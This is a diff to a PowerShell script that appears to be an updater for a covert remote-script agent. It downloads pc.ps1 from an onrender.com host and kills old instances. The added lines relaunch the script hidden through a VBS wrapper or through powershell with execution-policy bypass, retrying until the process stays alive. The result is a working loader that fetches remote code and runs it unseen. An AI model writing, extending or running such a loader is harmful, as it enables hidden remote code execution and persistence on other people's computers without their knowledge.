@@ -9,11 +9,19 @@ Invoke-WebRequest -Uri "https://orbe-xfzn.onrender.com/mao/pc.ps1" -OutFile $des
 Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Where-Object {
   $_.CommandLine -like "*OrbeMao*pc.ps1*"
 } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3
 $vbs = Join-Path $dir "ligar.vbs"
-if (Test-Path $vbs) {
-  Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs`"" -WindowStyle Hidden
-} else {
-  Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`"" -WindowStyle Hidden
+$args = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`""
+for ($i = 0; $i -lt 3; $i++) {
+  if (Test-Path $vbs) {
+    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs`"" -WindowStyle Hidden
+  } else {
+    Start-Process -FilePath "powershell.exe" -ArgumentList $args -WindowStyle Hidden
+  }
+  Start-Sleep -Seconds 5
+  $vivo = Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Where-Object {
+    $_.CommandLine -like "*OrbeMao*pc.ps1*"
+  }
+  if ($vivo) { break }
 }
 Write-Output "atualizei"
